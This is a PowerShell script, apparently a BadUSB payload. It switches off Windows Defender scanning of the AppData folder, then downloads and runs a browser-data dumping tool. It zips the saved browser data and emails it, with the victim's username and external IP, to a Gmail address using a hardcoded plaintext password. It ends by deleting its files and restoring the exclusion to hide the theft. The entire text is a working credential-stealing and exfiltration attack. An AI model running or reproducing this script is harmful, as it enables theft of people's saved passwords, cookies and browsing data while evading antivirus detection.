#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://raw.githubusercontent.com/GamehunterKaan/BadUSB-Browser/main/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work

$FROM = "rockpainter69@gmail.com"
$PASS = "gkwmxlhtozsflvwa"
$TO = "rockpainter69@gmail.com"

$PC_NAME = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$ip = Invoke-RestMethod "myexternalip.com/raw"
$SUBJECT = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$BODY = "All the data that are saved to " + $PC_NAME + " are in the attached file."
$ATTACH = "$env:appdata\Microsoft\dump\dump.zip"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"